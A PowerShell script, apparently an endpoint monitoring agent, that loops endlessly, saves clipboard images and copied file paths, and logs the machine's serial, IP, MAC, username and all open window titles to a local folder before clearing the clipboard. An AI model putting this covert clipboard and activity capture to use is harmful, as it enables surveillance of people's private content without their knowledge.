do {
if(!(test-path 'C:\ProgramData\soalog'))
{new-item -Path "C:\ProgramData\soalog" -ItemType Directory -Force }
$IP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress
$MAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"} | Where-Object {$_.InterfaceDescription -notmatch "TEST"}).MacAddress
$sn = (Get-WMIObject win32_physicalmedia | Where-Object {$_.tag -match "PHYSICALDRIVE0"} | select SerialNumber).SerialNumber
if ($sn -ne $null)
{
if ($sn -match " ")
{
$sn = $sn.split(" ")[-1]
}
else
{
$sn = $sn
}
}
elseif ($sn -eq $null)
{
$sn = (Get-WMIObject win32_physicalmedia | Where-Object {$_.tag -match "PHYSICALDRIVE1"} | select SerialNumber).SerialNumber
if ($sn -match " ")
{
$sn = $sn.split(" ")[-1]
}
else
{
$sn = $sn
}
}

$ErrorActionPreference = 'silentlycontinue'
#$startdtime = $startdtime.split("@") -join ":::;"


$image = Get-Clipboard -Format Image
$file = Get-Clipboard -Format FileDropList
If ($image) 
{
$window = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle).mainwindowtitle
$process = (Get-Process |where {$_.mainWindowTItle} | select processname).processname
$starttime = (Get-Process | where {$_.mainWindowTItle} | select starttime).starttime | % { $_.tostring("yyyy-MM-ddTHH:mm:ss+09:00")}
$count = $window.count
$currentdatetime = Get-Date -Format yyyy-MM-ddTHH:mm:ss+09:00
#$currentdatetime = $currentdatetime.split("@")
#$currentdate = $currentdatetime[0]
#$currenttime = $currentdatetime[1]
$path = 'C:\ProgramData\soalog'
$filename = "$path\${sn}_"+(Get-date -f yyyyMMddHHmmss)+"_clip.png"
$image.Save($filename,'png')
for($i=0; $i -lt $count; $i++)
{
$sn + ":::;" + $env:userdomain + ":::;" + $env:COMPUTERNAME + ":::;" + $IP + ":::;" + $MAC + ":::;" + $env:USERNAME + ":::;" + $window[$i] + ":::;" + $process[$i] + ":::;" + $starttime[$i] + ":::;" + $currentdatetime + ":::;" | out-file C:\ProgramData\soalog\${sn}_$(get-date -f yyyyMMddHHmmss)_clip_process.txt -Append -encoding utf8
}
$image.Dispose()
$file.Dispose()
$window.Dispose()
$process.Dispose()
$starttime.Dispose()
$count.Dispose()
$currentdatetime.Dispose()
$path.Dispose()
$filename.Dispose()


sleep 5
Set-Clipboard -Value $Null
}

elseif ($file)
{
$window = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle).mainwindowtitle
$process = (Get-Process |where {$_.mainWindowTItle} | select processname).processname
$starttime = (Get-Process | where {$_.mainWindowTItle} | select starttime).starttime | % { $_.tostring("yyyy-MM-ddTHH:mm:ss+09:00")}
$count = $window.count
$currentdatetime = Get-Date -Format yyyy-MM-ddTHH:mm:ss+09:00
$fcount = $file.count
$flastwritetime = $file.lastwritetime | % { $_.tostring("yyyy-MM-ddTHH:mm:ss+09:00")}
$fname = $file.fullname.Replace("\","\/")
$currentdatetime = Get-Date -Format yyyy-MM-ddTHH:mm:ss+09:00
if ($fcount -eq "1")
{
$sn + ":::;" + $fname + ":::;" + $flastwritetime + ":::;" + $currentdatetime + ":::;" | out-file C:\ProgramData\soalog\${sn}_$(get-date -f yyyyMMddHHmmss)_fclip.txt -Append -encoding utf8
}
else
{
for($i=0; $i -lt $fcount; $i++)
{
$sn + ":::;" + $fname[$i] + ":::;" + $flastwritetime[$i] + ":::;" + $currentdatetime + ":::;" | out-file C:\ProgramData\soalog\${sn}_$(get-date -f yyyyMMddHHmmss)_fclip.txt -Append -encoding utf8
}
}
for($i=0; $i -lt $count; $i++)
{
$sn + ":::;" + $env:userdomain + ":::;" + $env:COMPUTERNAME + ":::;" + $IP + ":::;" + $MAC + ":::;" + $env:USERNAME + ":::;" + $window[$i] + ":::;" + $process[$i] + ":::;" + $starttime[$i] + ":::;" + $currentdatetime + ":::;" | out-file C:\ProgramData\soalog\${sn}_$(get-date -f yyyyMMddHHmmss)_clip_process.txt -Append -encoding utf8
}
$window.Dispose()
$process.Dispose()
$starttime.Dispose()
$count.Dispose()
$currentdatetime.Dispose()
$path.Dispose()
$filename.Dispose()
$fcount.Dispose()
$flastwritetime.Dispose()
$fname.Dispose()
$sn.Dispose()
$ip.Dispose()
$MAC.Dispose()

sleep 3
Set-Clipboard -Value $Null

}
[System.GC]::Collect()
sleep 1
} 
while ($true)